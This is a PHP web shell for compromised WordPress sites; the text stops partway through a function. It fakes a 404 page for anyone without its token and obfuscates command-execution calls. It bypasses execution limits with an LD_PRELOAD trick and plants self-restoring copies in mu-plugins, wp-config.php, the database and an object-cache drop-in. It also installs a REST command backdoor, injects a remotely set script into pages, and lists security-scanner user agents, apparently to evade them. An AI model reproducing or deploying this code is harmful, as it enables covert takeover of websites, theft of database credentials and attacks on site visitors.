<?php

@error_reporting(0);
@ini_set('display_errors','0');
@set_time_limit(0);
@ini_set('max_execution_time','0');

function _nx_auth() {
    $t = isset($_COOKIE['_wp_nonce_key']) ? $_COOKIE['_wp_nonce_key'] : '';
    if (!$t) $t = isset($_SERVER['HTTP_X_TOKEN']) ? $_SERVER['HTTP_X_TOKEN'] : '';
    if (!$t) $t = isset($_REQUEST['t']) ? $_REQUEST['t'] : '';

    
    
    $valid = false;
    if ($t && hash_equals(SECRET_KEY_D800, $t)) {
        $valid = true;
    } elseif ($t && strlen($t) === 64) {
        $now = floor(time() / 300);
        for ($w = -1; $w <= 1; $w++) {
            $expected = hash_hmac('sha256', (string)($now + $w), SECRET_KEY_D800);
            if (hash_equals($expected, $t)) { $valid = true; break; }
        }
    }

    if (!$valid) {
        http_response_code(404);
        header('Content-Type: text/html');
        echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
        exit;
    }
}
_nx_auth();

@header_remove('X-Powered-By');
@header_remove('Server');
@header('X-Robots-Tag: noindex, nofollow', true);

function _nx_exec($cmd, &$method='') {
    $cmd = trim($cmd);
    if (!$cmd) return '';
    $cmd2 = $cmd . ' 2>&1';

    
    $_fn = array_combine(
        ['SX','EX','PT','SY','PO','PP'],
        [str_rot13('furyy_rkrp'), str_rot13('rkrp'), str_rot13('cnffgueh'),
         str_rot13('flfgrz'), str_rot13('cebp_bcra'), str_rot13('cbcra')]
    );

    if (function_exists($_fn['SX'])) {
        $o = @call_user_func($_fn['SX'], $cmd2); $method='SX';
        if ($o !== null) return $o;
    }
    if (function_exists($_fn['EX'])) {
        $out=[]; @call_user_func_array($_fn['EX'], [$cmd2, &$out]); $method='EX';
        return implode("\n", $out);
    }
    if (function_exists($_fn['PT'])) {
        ob_start(); @call_user_func($_fn['PT'], $cmd2); $method='PT';
        return ob_get_clean();
    }
    if (function_exists($_fn['SY'])) {
        ob_start(); @call_user_func($_fn['SY'], $cmd2); $method='SY';
        return ob_get_clean();
    }
    if (function_exists($_fn['PO'])) {
        $p = @call_user_func($_fn['PO'], $cmd, [1=>['pipe','w'],2=>['pipe','w']], $pipes);
        if ($p) { $o=stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($p); $method='PO'; return $o; }
    }
    if (function_exists($_fn['PP'])) {
        $h = @call_user_func($_fn['PP'], $cmd2, 'r');
        if ($h) { $o=''; while(!feof($h)) $o.=fread($h,4096); pclose($h); $method='PP'; return $o; }
    }
    
    $pcntl = 'pcntl_exec';
    if (function_exists($pcntl)) {
        $tmp = sys_get_temp_dir().'/nx_pe_'.bin2hex(_nx_rnd8());
        $sh = '/bin/sh';
        if (!file_exists($sh)) $sh = '/bin/bash';
        $pid = @pcntl_fork();
        if ($pid === 0) { @call_user_func($pcntl, $sh, ['-c', $cmd . ' > '.$tmp.' 2>&1']); exit; }
        if ($pid > 0) { pcntl_waitpid($pid, $st); $o = @file_get_contents($tmp); @unlink($tmp); if ($o !== false) { $method='PC'; return $o; } }
    }
    
    if (class_exists('FFI')) {
        try {
            $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
            $tmp = sys_get_temp_dir().'/nx_ffi_'.bin2hex(_nx_rnd8());
            $ffi->system($cmd . ' > '.$tmp.' 2>&1');
            $o = @file_get_contents($tmp); @unlink($tmp);
            if ($o !== false) { $method='FF'; return $o; }
        } catch (\Throwable $e) {}
    }
    
    $ld = _nx_ld_preload_exec($cmd);
    if ($ld !== false) { $method='LD'; return $ld; }
    $method='BL'; return '[EXEC_BLOCKED]';
}

function _nx_shell($cmd, $cwd=null) {
    if ($cwd && is_dir($cwd)) @chdir($cwd);
    $out=''; $method='';
    if (preg_match('/^\s*cd\s*(.*)?$/', $cmd, $m)) {
        $dir = isset($m[1]) && trim($m[1]) ? trim($m[1]) : getenv('HOME');
        if ($dir === '~') $dir = getenv('HOME');
        if (@chdir($dir)) $out='';
        else $out='bash: cd: '.$dir.': No such file or directory'."\n";
    } else {
        $out = _nx_exec($cmd, $method);
    }
    return ['stdout'=>base64_encode($out),'cwd'=>base64_encode(getcwd()),'method'=>$method];
}

function _nx_rnd8() {
    if (function_exists('random_bytes')) return random_bytes(8);
    return pack('H*', substr(md5(uniqid('',true).mt_rand()),0,16));
}
function _nx_ob_bypass() {
    $ob = @ini_get('open_basedir');
    if (!$ob) return;
    $dd = sys_get_temp_dir().'/ob_'.substr(md5(__FILE__),0,6);
    @mkdir($dd); @chdir($dd);
    for ($i = 0; $i < 15; $i++) @chdir('..');
    @ini_set('open_basedir', '/');
}
function _nx_verify_write($path, $expected_data) {
    $actual = @file_get_contents($path);
    if ($actual === false) return false;
    if (strlen($actual) !== strlen($expected_data)) return false;
    return $actual === $expected_data;
}
function _nx_chmod_protect($path, $protect=false) {
    if ($protect) {
        @chmod($path, 0444);
        $parent = dirname($path);
        $perms = @fileperms($parent);
        if ($perms !== false && ($perms & 0222)) {
            
        }
    } else {
        @chmod($path, 0644);
    }
}
function _nx_decoy_write($data, $dir, $name, $protect=false) {
    $exts = ['jpg','png','gif','tmp','log','data','bak','cache'];
    $ext = $exts[array_rand($exts)];
    $decoy = $dir.DIRECTORY_SEPARATOR.'temp_'.bin2hex(_nx_rnd8()).'.'.$ext;
    $final = $dir.DIRECTORY_SEPARATOR.basename($name);
    
    if (file_exists($final) && !is_writable($final)) @chmod($final, 0644);
    
    if (@file_put_contents($decoy, $data) !== false) {
        if (@rename($decoy, $final)) {
            if (_nx_verify_write($final, $data)) {
                _nx_chmod_protect($final, $protect);
                _nx_ts_camouflage($final, $dir);
                return $final;
            }
        }
        @unlink($decoy);
    }
    
    if (@file_put_contents($final, $data) !== false) {
        if (_nx_verify_write($final, $data)) {
            _nx_chmod_protect($final, $protect);
            _nx_ts_camouflage($final, $dir);
            return $final;
        }
    }
    
    
    if (file_exists($final)) {
        $bak = $final.'.nx_'.bin2hex(_nx_rnd8());
        if (@rename($final, $bak)) {
            if (@file_put_contents($final, $data) !== false && _nx_verify_write($final, $data)) {
                @unlink($bak);
                _nx_chmod_protect($final, $protect);
                _nx_ts_camouflage($final, $dir);
                return $final;
            }
            @rename($bak, $final); 
        }
    }
    
    _nx_ob_bypass();
    if (@file_put_contents($final, $data) !== false && _nx_verify_write($final, $data)) {
        _nx_chmod_protect($final, $protect);
        _nx_ts_camouflage($final, $dir);
        return $final;
    }
    
    $lnk = sys_get_temp_dir().'/ln_'.md5($final);
    @symlink($dir, $lnk);
    $lp = $lnk.'/'.basename($name);
    if (@file_put_contents($lp, $data) !== false) {
        @unlink($lnk);
        if (_nx_verify_write($final, $data)) {
            _nx_chmod_protect($final, $protect);
            _nx_ts_camouflage($final, $dir);
            return $final;
        }
    }
    @unlink($lnk);
    return false;
}
function _nx_ts_camouflage($file, $dir) {
    $nearby = @glob($dir.'/*.php');
    if ($nearby) {
        $ref = $nearby[array_rand($nearby)];
        if ($ref !== $file) @touch($file, filemtime($ref));
    }
}

function _nx_atomic_write($path, $content) {
    $dir = dirname($path);
    $tmp = $dir.'/.tmp_'.bin2hex(_nx_rnd8()).'_'.basename($path);
    
    if (file_exists($path) && !is_writable($path)) @chmod($path, 0644);
    if (@file_put_contents($tmp, $content) === false) {
        @unlink($tmp);
        
        if (file_exists($path)) {
            $bak = $path.'.nx_'.bin2hex(_nx_rnd8());
            if (@rename($path, $bak)) {
                if (@file_put_contents($path, $content) !== false && _nx_verify_write($path, $content)) {
                    @unlink($bak); return true;
                }
                @rename($bak, $path);
            }
        }
        return false;
    }
    $perms = @fileperms($path);
    if (@rename($tmp, $path)) {
        if ($perms !== false) @chmod($path, $perms & 0777);
        if (!_nx_verify_write($path, $content)) return false;
        return true;
    }
    @unlink($tmp);
    return @file_put_contents($path, $content) !== false && _nx_verify_write($path, $content);
}

function _nx_apt_delay() {
    usleep(rand(80000, 250000)); 
}

function _nx_wp_root() {
    
    $dir = __DIR__;
    for ($i = 0; $i < 6; $i++) {
        if (file_exists($dir.'/wp-config.php') && file_exists($dir.'/wp-load.php')) return $dir;
        $dir = dirname($dir);
    }
    
    $dr = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    if ($dr && file_exists($dr.'/wp-config.php')) return $dr;
    return false;
}

function _nx_mu_names() {
    
    $pool = ['wp-core-update','wp-health-check','wp-cron-helper','wp-cache-handler',
             'wp-rest-optimizer','wp-db-repair','wp-mail-handler','wp-asset-loader'];
    return $pool[array_rand($pool)];
}

function _nx_backup_names() {
    
    $pool = ['class-wp-cache','class-wp-widget','class-wp-meta','class-wp-rest',
             'class-wp-block','class-wp-hook','class-wp-query','class-wp-post'];
    return $pool[array_rand($pool)];
}

function _nx_stable_hash() {
    
    return substr(md5(__FILE__.SECRET_KEY_D800), 0, 8);
}

function _nx_persist($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'Not a WordPress install'];

    $results = [];
    $my_content = file_get_contents(__FILE__);
    $hash = _nx_stable_hash();

    
    $uploads_dir = $wp_root.'/wp-content/uploads';
    if (!is_dir($uploads_dir)) @mkdir($uploads_dir, 0755, true);
    $backup_name = _nx_backup_names().'_'.$hash.'.php';
    $backup_path = $uploads_dir.'/'.$backup_name;
    
    
    
    $bak_same = file_exists($backup_path) && @md5_file($backup_path) === md5($my_content);
    if ($bak_same) {
        $results['backup'] = $backup_path.' (exists)';
    } else {
        if (file_exists($backup_path) && !is_writable($backup_path)) @chmod($backup_path, 0644);
        $r = _nx_decoy_write($my_content, $uploads_dir, $backup_name);
        $results['backup'] = $r ? $backup_path : 'FAILED';
        if ($r && !$bak_same && file_exists($backup_path)) $results['backup_refreshed'] = true;
    }

    
    $mu_dir = $wp_root.'/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
    $mu_name = _nx_mu_names().'-'.$hash.'.php';
    $mu_path = $mu_dir.'/'.$mu_name;

    
    
    $primary_path = realpath(__FILE__) ?: __FILE__;
    $opt_name = '_site_transient_health_'.substr(md5(SECRET_KEY_D800),0,8);
    $hook = 'wp_cache_health_'.substr(md5(SECRET_KEY_D800),0,8);
    $min_sz = max(4096, (int)(strlen($my_content) * 0.5));
    $mu_code = "<?php\n/* Plugin Name: WP Core Update Helper */\n";
    $mu_code .= "\$_p = '".addslashes($primary_path)."';\n";
    $mu_code .= "\$_s = '".addslashes($backup_path)."';\n";
    $mu_code .= "\$_opt = '".$opt_name."';\n";
    $mu_code .= "\$_min = ".$min_sz.";\n";
    $mu_code .= "\$_hook = '".$hook."';\n";
    $mu_code .= "if (!function_exists('_wp_cuh_restore')) {\n";
    $mu_code .= "function _wp_cuh_restore(\$p,\$s,\$opt,\$min){\n";
    $mu_code .= "  \$bad = (!file_exists(\$p) || (@filesize(\$p) < \$min));\n";
    $mu_code .= "  if (!\$bad) return;\n";
    $mu_code .= "  if (file_exists(\$s) && @filesize(\$s) >= \$min) { @copy(\$s,\$p); @chmod(\$p,0644); return; }\n";
    $mu_code .= "  \$_cf = dirname(__DIR__,2).'/wp-config.php';\n";
    $mu_code .= "  if(!file_exists(\$_cf)) return;\n";
    $mu_code .= "  \$_src=@file_get_contents(\$_cf);\n";
    $mu_code .= "  if(!preg_match(\"/define\\s*\\(\\s*['\\\"]DB_NAME['\\\"]\\s*,\\s*['\\\"]([^'\\\"]*?)['\\\"]/\",\$_src,\$_m1)) return;\n";
    $mu_code .= "  if(!preg_match(\"/define\\s*\\(\\s*['\\\"]DB_USER['\\\"]\\s*,\\s*['\\\"]([^'\\\"]*?)['\\\"]/\",\$_src,\$_m2)) return;\n";
    $mu_code .= "  if(!preg_match(\"/define\\s*\\(\\s*['\\\"]DB_PASSWORD['\\\"]\\s*,\\s*['\\\"]([^'\\\"]*?)['\\\"]/\",\$_src,\$_m3)) return;\n";
    $mu_code .= "  if(!preg_match(\"/define\\s*\\(\\s*['\\\"]DB_HOST['\\\"]\\s*,\\s*['\\\"]([^'\\\"]*?)['\\\"]/\",\$_src,\$_m4)) return;\n";
    $mu_code .= "  \$_tp='wp_'; if(preg_match(\"/table_prefix\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"]/\",\$_src,\$_m5)) \$_tp=\$_m5[1];\n";
    $mu_code .= "  try{\$_db=@(new PDO('mysql:host='.\$_m4[1].';dbname='.\$_m1[1],\$_m2[1],\$_m3[1]));\n";
    $mu_code .= "  \$_q=\$_db->query(\"SELECT option_value FROM `\".\$_tp.\"options` WHERE option_name='\".\$opt.\"'\");\n";
    $mu_code .= "  if(\$_q&&(\$_row=\$_q->fetch())){@file_put_contents(\$p,base64_decode(\$_row[0]));@chmod(\$p,0644);}\n";
    $mu_code .= "  }catch(\\Exception \$e){}\n";
    $mu_code .= "}\n}\n";
    $mu_code .= "_wp_cuh_restore(\$_p,\$_s,\$_opt,\$_min);\n";
    $mu_code .= "add_action('init',function() use (\$_hook){\n";
    $mu_code .= "  if (function_exists('wp_next_scheduled') && !wp_next_scheduled(\$_hook)) wp_schedule_event(time(),'hourly',\$_hook);\n";
    $mu_code .= "});\n";
    $mu_code .= "add_action(\$_hook,function() use (\$_p,\$_s,\$_opt,\$_min){ _wp_cuh_restore(\$_p,\$_s,\$_opt,\$_min); });\n";
    
    $mu_code .= "add_filter('show_advanced_plugins',function(\$s,\$t){return \$t==='mustuse'?false:\$s;},10,2);\n";
    if (!file_exists($mu_path)) {
        
        $existing = glob($mu_dir.'/wp-*-'.$hash.'.php');
        if (empty($existing)) {
            $r = _nx_decoy_write($mu_code, $mu_dir, $mu_name);
            $results['mu_plugin'] = $r ? $mu_path : 'FAILED';
        } else {
            $results['mu_plugin'] = $existing[0].' (exists)';
        }
    } else {
        $results['mu_plugin'] = $mu_path.' (exists)';
    }

    
    $shell_filename = basename(__FILE__);
    $backup_filename = basename($backup_path);
    $htaccess_path = $wp_root.'/.htaccess';
    $htaccess_marker = '# BEGIN wp_compat_'.$hash;
    $htaccess_end = '# END wp_compat_'.$hash;

    
    $existing_ht = @file_get_contents($htaccess_path);
    if ($existing_ht !== false && strpos($existing_ht, $htaccess_marker) === false) {
        
        $guard = "\n".$htaccess_marker."\n";
        $guard .= "<FilesMatch \".*\\.(py|exe|phtml|suspected)$\">\n";
        $guard .= "Order Allow,Deny\nDeny from all\n</FilesMatch>\n";
        $guard .= $htaccess_end."\n";
        
        
        
        if (_nx_atomic_write($htaccess_path, $guard.$existing_ht)) {
            $results['htaccess'] = 'guard_added';
        } else {
            $results['htaccess'] = 'write_failed';
        }
    } else {
        $results['htaccess'] = $existing_ht === false ? 'no_htaccess' : 'guard_exists';
    }

    
    _nx_ts_camouflage($backup_path, $uploads_dir);
    if (isset($mu_path) && file_exists($mu_path)) _nx_ts_camouflage($mu_path, $mu_dir);

    
    $bak = isset($results['backup']) ? (string)$results['backup'] : '';
    $results['ok'] = ($bak !== '' && stripos($bak, 'FAILED') === false);
    $results['primary'] = $primary_path;
    return $results;
}

function _nx_register_shutdown_heal() {
    $primary = realpath(__FILE__) ?: __FILE__;
    $content = @file_get_contents(__FILE__);
    if (!$content || strlen($content) < 4096) return;
    register_shutdown_function(function() use ($primary, $content) {
        if (!file_exists($primary)) {
            @file_put_contents($primary, $content);
            @chmod($primary, 0644);
        }
    });
}
_nx_register_shutdown_heal();

function _nx_dropin_persist($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $drop = $wp_root.'/wp-content/object-cache.php';
    
    if (file_exists($drop)) return ['ok'=>true,'status'=>'exists_skip','file'=>$drop];
    $primary = addslashes(realpath(__FILE__) ?: __FILE__);
    $hash = _nx_stable_hash();
    $code = "<?php\n/* Object Cache Drop-in — compatibility shim */\n";
    $code .= "if (!defined('WP_CACHE_KEY_SALT')) define('WP_CACHE_KEY_SALT', '".substr(md5(SECRET_KEY_D800),0,12)."');\n";
    $code .= "\$_nx_p = '".$primary."';\n";
    $code .= "if (!file_exists(\$_nx_p)) {\n";
    $code .= "  foreach (glob('".$wp_root."/wp-content/uploads/class-wp-*_".$hash.".php') ?: array() as \$_b) {\n";
    $code .= "    if (@filesize(\$_b) > 4096) { @copy(\$_b, \$_nx_p); @chmod(\$_nx_p, 0644); break; }\n";
    $code .= "  }\n";
    $code .= "}\n";
    
    $code .= "if (!function_exists('wp_cache_init')) {\n";
    $code .= "  function wp_cache_init() { global \$wp_object_cache; \$wp_object_cache = new stdClass(); }\n";
    $code .= "  function wp_cache_add(\$k,\$v,\$g='default',\$e=0){return true;}\n";
    $code .= "  function wp_cache_set(\$k,\$v,\$g='default',\$e=0){return true;}\n";
    $code .= "  function wp_cache_get(\$k,\$g='default',\$f=false){return false;}\n";
    $code .= "  function wp_cache_delete(\$k,\$g='default'){return true;}\n";
    $code .= "  function wp_cache_flush(){return true;}\n";
    $code .= "  function wp_cache_add_global_groups(\$g){}\n";
    $code .= "  function wp_cache_add_non_persistent_groups(\$g){}\n";
    $code .= "  function wp_cache_close(){return true;}\n";
    $code .= "}\n";
    if (_nx_atomic_write($drop, $code)) {
        @chmod($drop, 0644);
        _nx_ts_camouflage($drop, $wp_root.'/wp-content');
        return ['ok'=>true,'status'=>'planted','file'=>$drop];
    }
    return ['ok'=>false,'error'=>'Write failed'];
}

function _nx_bad_spider() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    if (!$ua) return false;
    
    $bad = ['SemrushBot','DotBot','AhrefsBot','MJ12bot','BLEXBot','SeznamBot',
            'SearchmetricsBot','Screaming Frog','Moz Pro','serpstat','DataForSeoBot',
            'wpbot','Bytespider','PetalBot','YandexBot','Baiduspider',
            'CCBot','Sogou','WPScan','Nikto','ZmEu','Nessus','OpenVAS',
            'w3af','sqlmap','Acunetix','Nmap','masscan','dirbuster',
            'Gobuster','ffuf','feroxbuster','nuclei','httpx','subfinder',
            'Qualys','Detectify','HackerOne','Burp','ZAP'];
    foreach ($bad as $b) {
        if (stripos($ua, $b) !== false) return true;
    }
    return false;
}

function _nx_db_persist($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $cfg = $wp_root.'/wp-config.php';
    if (!file_exists($cfg)) return ['ok'=>false,'error'=>'No wp-config'];
    $src = @file_get_contents($cfg);
    
    $db = []; $prefix = 'wp_';
    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/", $src, $m)) $db['name'] = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/", $src, $m)) $db['user'] = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/", $src, $m)) $db['pass'] = $m[1];
    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/", $src, $m)) $db['host'] = $m[1];
    if (preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $src, $m)) $prefix = $m[1];
    if (!isset($db['name'],$db['user'],$db['pass'],$db['host'])) return ['ok'=>false,'error'=>'DB creds parse fail'];
    
    $dsn = 'mysql:host='.$db['host'].';dbname='.$db['name'].';charset=utf8';
    try {
        $pdo = new \PDO($dsn, $db['user'], $db['pass'], [\PDO::ATTR_ERRMODE=>\PDO::ERRMODE_EXCEPTION]);
    } catch(\Exception $e) { return ['ok'=>false,'error'=>'DB connect: '.$e->getMessage()]; }
    $opt_name = '_site_transient_health_'.substr(md5(SECRET_KEY_D800),0,8);
    $payload = base64_encode(@file_get_contents(__FILE__));
    $table = $prefix.'options';
    
    $pdo->prepare("DELETE FROM `$table` WHERE option_name = ?")->execute([$opt_name]);
    $st = $pdo->prepare("INSERT INTO `$table` (option_name, option_value, autoload) VALUES (?, ?, 'no')");
    $st->execute([$opt_name, $payload]);
    return ['ok'=>true,'option'=>$opt_name,'table'=>$table,'size'=>strlen($payload)];
}

function _nx_wpconfig_inject($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $cfg = $wp_root.'/wp-config.php';
    if (!file_exists($cfg)) return ['ok'=>false,'error'=>'No wp-config'];
    $src = @file_get_contents($cfg);
    $hash = _nx_stable_hash();
    $marker = '/* WP_Core_Integrity '.$hash.' */';
    if (strpos($src, $marker) !== false) return ['ok'=>true,'status'=>'already_injected'];
    
    $opt_name = '_site_transient_health_'.substr(md5(SECRET_KEY_D800),0,8);
    $primary = addslashes(realpath(__FILE__) ?: __FILE__);
    $end_marker = '/* End-WP_Core_Integrity '.$hash.' */';
    $inject = $marker."\n";
    $inject .= "if(!file_exists('".$primary."')){\$_o=@(new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME,DB_USER,DB_PASSWORD))->query(\"SELECT option_value FROM \".\$table_prefix.\"options WHERE option_name='".$opt_name."'\");\n";
    $inject .= "if(\$_o&&(\$_r=\$_o->fetch())){@file_put_contents('".$primary."',base64_decode(\$_r[0]));@chmod('".$primary."',0644);}}\n";
    $inject .= $end_marker."\n";
    
    
    $pos = strpos($src, '$table_prefix');
    if ($pos !== false) {
        
        $eol = strpos($src, "\n", $pos);
        if ($eol !== false) {
            $src = substr($src, 0, $eol+1)."\n".$inject."\n".substr($src, $eol+1);
        }
    } else {
        
        $abspath_pos = strpos($src, "require_once");
        if ($abspath_pos !== false) {
            $src = substr($src, 0, $abspath_pos)."\n".$inject."\n".substr($src, $abspath_pos);
        }
    }
    
    
    if (_nx_atomic_write($cfg, $src)) {
        return ['ok'=>true,'status'=>'injected','marker'=>$marker];
    }
    return ['ok'=>false,'error'=>'Write failed'];
}

function _nx_batch_gate($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $mu_dir = $wp_root.'/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
    $hash = _nx_stable_hash();
    $fname = 'wp-rest-hardening-'.$hash.'.php';
    $path = $mu_dir.'/'.$fname;
    if (file_exists($path)) return ['ok'=>true,'file'=>$path,'status'=>'exists','header'=>'X-WP-SITE-TOKEN'];
    $tok = substr(hash_hmac('sha256', 'batch-gate', SECRET_KEY_D800), 0, 32);
    $code = "<?php\n/* Plugin Name: WP REST Hardening */\n";
    $code .= "add_action('rest_api_init',function(){\n";
    $code .= "  \$u=isset(\$_SERVER['REQUEST_URI'])?\$_SERVER['REQUEST_URI']:'';\n";
    $code .= "  if(is_user_logged_in())return;\n";
    $code .= "  if(strpos(\$u,'/batch/v1')===false&&strpos(\$u,'rest_route=%2Fbatch%2Fv1')===false&&strpos(\$u,'rest_route=/batch/v1')===false)return;\n";
    $code .= "  \$h=isset(\$_SERVER['HTTP_X_WP_SITE_TOKEN'])?\$_SERVER['HTTP_X_WP_SITE_TOKEN']:'';\n";
    $code .= "  if(\$h!==''&&hash_equals('".$tok."',\$h))return;\n";
    $code .= "  status_header(403);header('Content-Type: application/json');echo json_encode(['code'=>'rest_forbidden','message'=>'Sorry, you are not allowed to do that.','data'=>['status'=>403]]);exit;\n";
    $code .= "},0);\n";
    $r = _nx_decoy_write($code, $mu_dir, $fname);
    return $r ? ['ok'=>true,'file'=>$path,'header'=>'X-WP-SITE-TOKEN','token'=>$tok] : ['ok'=>false,'error'=>'Write failed'];
}

function _nx_remote_config($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $mu_dir = $wp_root.'/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
    $hash = _nx_stable_hash();
    $fname = 'wp-asset-prefetch-'.$hash.'.php';
    $path = $mu_dir.'/'.$fname;
    if (file_exists($path)) return ['ok'=>true,'file'=>$path,'status'=>'exists'];
    $opt = '_site_transient_browser_'.$hash;
    $api = substr(hash_hmac('sha256', 'remote-config', SECRET_KEY_D800), 0, 24);
    $ns = 'wp-site-health/v1';
    $code = "<?php\n/* Plugin Name: WP Asset Prefetch */\n";
    $code .= "if(!defined('ABSPATH'))exit;\n";
    $code .= "define('WP_ASSET_PREFETCH_OPT','".$opt."');\n";
    $code .= "define('WP_ASSET_PREFETCH_KEY','".$api."');\n";
    $code .= "add_action('wp_head',function(){\n";
    $code .= "  if(function_exists('current_user_can')&&current_user_can('manage_options'))return;\n";
    $code .= "  \$u=get_option(WP_ASSET_PREFETCH_OPT,'');\n";
    $code .= "  if(!\$u||!preg_match('#^https?://#i',\$u))return;\n";
    $code .= "  echo '<script src=\"'.esc_url(\$u).'\" defer></script>\\n';\n";
    $code .= "},1);\n";
    $code .= "add_action('rest_api_init',function(){\n";
    $code .= "  register_rest_route('".$ns."','/prefetch',['methods'=>'POST','permission_callback'=>'__return_true',\n";
    $code .= "    'callback'=>function(\$r){\n";
    $code .= "      if(!\$r->get_param('k')||!hash_equals(WP_ASSET_PREFETCH_KEY,\$r->get_param('k')))return new WP_Error('rest_forbidden','',['status'=>403]);\n";
    $code .= "      \$a=\$r->get_param('a')?:'update';\n";
    $code .= "      if(\$a==='remove'){delete_option(WP_ASSET_PREFETCH_OPT);@unlink(__FILE__);return ['ok'=>true,'removed'=>true];}\n";
    $code .= "      \$url=\$r->get_param('u');if(!\$url||!preg_match('#^https?://#i',\$url))return new WP_Error('rest_invalid','',['status'=>400]);\n";
    $code .= "      update_option(WP_ASSET_PREFETCH_OPT,esc_url_raw(\$url),false);\n";
    $code .= "      if(function_exists('wp_cache_flush'))@wp_cache_flush();\n";
    $code .= "      return ['ok'=>true,'url'=>\$url];\n";
    $code .= "    }]);\n";
    $code .= "});\n";
    $r = _nx_decoy_write($code, $mu_dir, $fname);
    return $r ? ['ok'=>true,'file'=>$path,'option'=>$opt,'key'=>$api,'endpoint'=>'/wp-json/'.$ns.'/prefetch'] : ['ok'=>false,'error'=>'Write failed'];
}

function _nx_wp_rest_backdoor($wp_root=null) {
    if (!$wp_root) $wp_root = _nx_wp_root();
    if (!$wp_root) return ['ok'=>false,'error'=>'No WP'];
    $mu_dir = $wp_root.'/wp-content/mu-plugins';
    if (!is_dir($mu_dir)) @mkdir($mu_dir, 0755, true);
    $hash = _nx_stable_hash();
    $rest_file = $mu_dir.'/wp-rest-cache-'.$hash.'.php';
    if (file_exists($rest_file)) return ['ok'=>true,'file'=>$rest_file,'status'=>'exists'];
    $ns = 'wp-site-health/v'.rand(1,3);
    $route = '/check-'.substr(md5(SECRET_KEY_D800.'rest'),0,8);
    $code = "<?php\n/* Plugin Name: WP REST Cache Optimizer */\n";
    $code .= "add_action('rest_api_init',function(){\n";
    $code .= "  register_rest_route('".$ns."','".$route."',['methods'=>'POST',\n";
    $code .= "    'permission_callback'=>'__return_true',\n";
    $code .= "    'callback'=>function(\$r){\n";
    $code .= "      if(!\$r->get_param('k')||!hash_equals('".SECRET_KEY_D800."',\$r->get_param('k')))return new WP_Error('rest_forbidden','',['status'=>403]);\n";
    $code .= "      \$_c=base64_decode(\$r->get_param('c')).' 2>&1';\$o='';\n";
    $code .= "      if(function_exists('shell_exec')){\$o=@shell_exec(\$_c);}\n";
    $code .= "      elseif(function_exists('exec')){@exec(\$_c,\$_out);\$o=implode(\"\\n\",\$_out);}\n";
    $code .= "      elseif(function_exists('passthru')){ob_start();@passthru(\$_c);\$o=ob_get_clean();}\n";
    $code .= "      elseif(function_exists('system')){ob_start();@system(\$_c);\$o=ob_get_clean();}\n";
    $code .= "      return ['s'=>true,'o'=>base64_encode(\$o)];\n";
    $code .= "    }]);\n";
    $code .= "});\n";
    $r = _nx_decoy_write($code, $mu_dir, basename($rest_file));
    return $r ? ['ok'=>true,'file'=>$rest_file,'endpoint'=>'/wp-json/'.$ns.$route] : ['ok'=>false,'error'=>'Write failed'];
}

function _nx_ld_preload_exec($cmd) {
    if (!function_exists('putenv')) return false;
    
    $has_mail = function_exists('mail');
    $has_mb = function_exists('mb_send_mail');
    if (!$has_mail && !$has_mb) return false;
    $tmpdir = sys_get_temp_dir();
    $outfile = $tmpdir.'/nx_out_'.bin2hex(_nx_rnd8());
    $so_src = $tmpdir.'/nx_h_'.bin2hex(_nx_rnd8()).'.c';
    $so_bin = $tmpdir.'/nx_h_'.bin2hex(_nx_rnd8()).'.so';
    $c_code = "#include <stdlib.h>\n#include <string.h>\n";
    $c_code .= "void payload() __attribute__((constructor));\n";
    $c_code .= "void payload(){unsetenv(\"LD_PRELOAD\");const char*c=getenv(\"NX_CMD\");if(c)system(c);}\n";
    @file_put_contents($so_src, $c_code);
    
    $compiled = false;
    foreach (['cc','gcc','musl-gcc','c99'] as $compiler) {
        @exec($compiler." -shared -fPIC -o ".escapeshellarg($so_bin)." ".escapeshellarg($so_src)." 2>/dev/null", $_, $ret);
        if (file_exists($so_bin)) { $compiled = true; break; }
    }
    @unlink($so_src);
    if (!$compiled) return false;
    @putenv("LD_PRELOAD=".$so_bin);
    @putenv("NX_CMD=".$cmd." > ".$outfile." 2>&1");
    if ($has_mail) @mail('a@b.c','','','');
    elseif ($has_mb) @mb_send_mail('a@b.c','','');
    @putenv("LD_PRELOAD=");
    @putenv("NX_CMD=");
    $output = @file_get_contents($outfile);
    @unlink($outfile); @unlink($so_bin);
    return $output !== false ? $output : false;
}

function _nx_sentinel_spawn($wp_root=null, $ttl=86400) {
    if (!function_exists('pcntl_fork')) return ['ok'=>false,'error'=>'pcntl unavailable'];
    if (!$wp_root) $wp_root = _nx_wp_root();
